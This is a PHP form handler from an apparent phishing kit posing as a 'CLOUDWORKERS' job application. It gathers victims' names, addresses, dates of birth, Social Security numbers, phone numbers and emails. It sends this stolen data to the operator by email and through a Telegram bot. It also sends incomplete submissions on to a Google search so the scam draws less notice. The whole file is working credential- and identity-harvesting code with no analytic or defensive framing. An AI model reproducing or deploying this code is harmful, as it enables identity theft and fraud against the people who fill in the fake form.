<?php
session_start();
error_reporting(0);
# Adding Settings 
include('function.php');
include('../config.php');


$useragent = $_SERVER['HTTP_USER_AGENT'];

$required = array('firstname', 'statename');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}
 
if ($error) {
  header('Location: https://www.google.com/search?q=FREEWAVE+LOGIN');
} else {
# Logs


$msgtg = '
🔥== CLOUDWORKERS NEW FROM {'.$IP.'} ==✅

*🔓FIRST NAME  * : '.$_POST['firstname'].'
*🔓MIDDLE NAME * : '.$_POST['middlename'].'
*🔓LAST NAME   * : '.$_POST['lastname'].'
*🔓ADDRESS     * : '.$_POST['address'].'
*🔓STATE       * : '.$_POST['statename'].'
*🔓CITY        * : '.$_POST['cityname'].'
*🔓ZIP CODE    * : '.$_POST['PostalCode'].'
*🔓POSITION    * : '.$_POST['position'].'
*🔓DOB         * : '.$_POST['dob'].'
*🔓SSN         * : '.$_POST['ssn'].'
*🔓GENDER      * : '.$_POST['gender'].'
*🔓EMPLOYMENT STATUS * : '.$_POST['empstatus'].'
*🔓PHONE NUM  * : '.$_POST['Phonenum'].'
*🔓AVAIL START DATE  * : '.$_POST['avstartdt'].'
*🔓EMAIL ADDRESS  * : '.$_POST['emailAddress'].'

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP='.$IP.'
*Date* : '.$date.'
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';


if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: xforgex <CLOUDWORKERS@client_site.com>\r\n";
  $subject = "✦ CLOUDWORKERS FORM FROM ✦ {$IP} ✦";
  $msg = $msgtg;
  mail($to, $subject, $msg, $headers);
   }

 # Send Bot

if ($settings['telegram'] == "1"){
  $data = $msgtg;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/bot{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  }


header('Location: ../form.php?5885c55e-eed6-3bde-9cbe-06a5eb05f2f0');

}
?>